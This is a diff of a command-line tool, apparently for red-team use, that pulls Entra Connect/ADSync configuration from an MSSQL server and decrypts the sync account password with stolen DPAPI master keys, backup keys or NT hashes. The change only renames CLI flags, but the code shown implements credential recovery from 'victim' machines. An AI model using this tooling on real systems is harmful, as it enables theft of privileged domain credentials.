@@ -120,9 +120,9 @@ def _recover_masterkey(mk, dk, backup_key="", nthash="", sid=""):
     (+ SID) or from the domain's DPAPI backup private key."""
     if nthash:
         if mk is None:
-            raise ValueError("Masterkey file has no MasterKey blob, cannot use -nthash")
+            raise ValueError("Masterkey file has no MasterKey blob, cannot use --nthash")
         if not sid:
-            raise ValueError("-sid is required alongside -nthash")
+            raise ValueError("--sid is required alongside --nthash")
         nthash_bytes = bytes.fromhex(nthash.replace(":", ""))
         for candidate in deriveKeysFromUserkey(sid, nthash_bytes):
             decrypted = mk.decrypt(candidate)
@@ -131,7 +131,7 @@ def _recover_masterkey(mk, dk, backup_key="", nthash="", sid=""):
         raise ValueError("Masterkey decryption failed, wrong nthash or SID")
 
     if dk is None:
-        raise ValueError("Masterkey file has no DomainKey blob, cannot use -backupkey")
+        raise ValueError("Masterkey file has no DomainKey blob, cannot use --backup-key")
     with open(backup_key, "rb") as f:
         pvk_data = f.read()
     pvk = PRIVATE_KEY_BLOB(pvk_data[len(PVK_FILE_HDR()):])
@@ -156,16 +156,16 @@ def _decrypt_blob(masterkey_path, blob, entropy, backup_key="", nthash="", sid="
 @azsync_app.command("extract")
 @handle_cli_errors
 def azsync_extract(
-        target: str = typer.Option("127.0.0.1", "-target", help="The IP address of the MSSQL server"),
-        port: int = typer.Option(1433, "-port", help="port"),
-        windows_auth: bool = typer.Option(False, "-windows-auth", help="Use Windows/NTLM authentication instead of SQL authentication"),
-        username: str = typer.Option(..., "-username", help="Username of the associated user"),
-        password: str = typer.Option(..., "-password", help="Password of the associated user"),
-        domain: str = typer.Option(None, "-domain", help="Domain name"),
-        masterkey: str = typer.Option(None, "-masterkey", help="Path to the DPAPI master key file (must be acquired extracted from the victim machine)"),
-        backup_key:  str = typer.Option(None, "-backupkey", help="Path to the DPAPI backupkey (must be acquired extracted from the victim machine)"),
-        nthash:  str = typer.Option(None, "-nthash", help="NT hash of the masterkey owner, used with -sid (must be acquired extracted from the victim machine)"),
-        sid: str = typer.Option(None, "-sid", help="SID of the masterkey owner, required alongside -nthash"),
+        target: str = typer.Option("127.0.0.1", "-t", "--target", help="The IP address of the MSSQL server"),
+        port: int = typer.Option(1433, "-r", "--port", help="port"),
+        windows_auth: bool = typer.Option(False, "-w", "--windows-auth", help="Use Windows/NTLM authentication instead of SQL authentication"),
+        username: str = typer.Option(..., "-u", "--username", help="Username of the associated user"),
+        password: str = typer.Option(..., "-p", "--password", help="Password of the associated user"),
+        domain: str = typer.Option(None, "-d", "--domain", help="Domain name"),
+        masterkey: str = typer.Option(None, "-m", "--master-key", help="Path to the DPAPI master key file (must be acquired extracted from the victim machine)"),
+        backup_key:  str = typer.Option(None, "-b", "--backup-key", help="Path to the DPAPI backupkey (must be acquired extracted from the victim machine)"),
+        nthash:  str = typer.Option(None, "-n", "--nthash", help="NT hash of the masterkey owner, used with --sid (must be acquired extracted from the victim machine)"),
+        sid: str = typer.Option(None, "-s", "--sid", help="SID of the masterkey owner, required alongside --nthash"),
         output: OutputFormat = output_option(),
 ):
     """Pull the ADSync configuration off a MSSQL instance backing an Entra Connect / ADSync install.
@@ -222,6 +222,6 @@ def azsync_extract(
                               backup_key=backup_key, nthash=nthash, sid=sid))
             console.print(f"[bold green][+][/] Recovered password for {sync_user or 'Entra sync account'}: {sync_password}")
         else:
-            console.print("[bold yellow][!][/] Provide -masterkey with -backupkey or -nthash/-sid to recover the sync account password")
+            console.print("[bold yellow][!][/] Provide --master-key with --backup-key or --nthash/--sid to recover the sync account password")
 
 
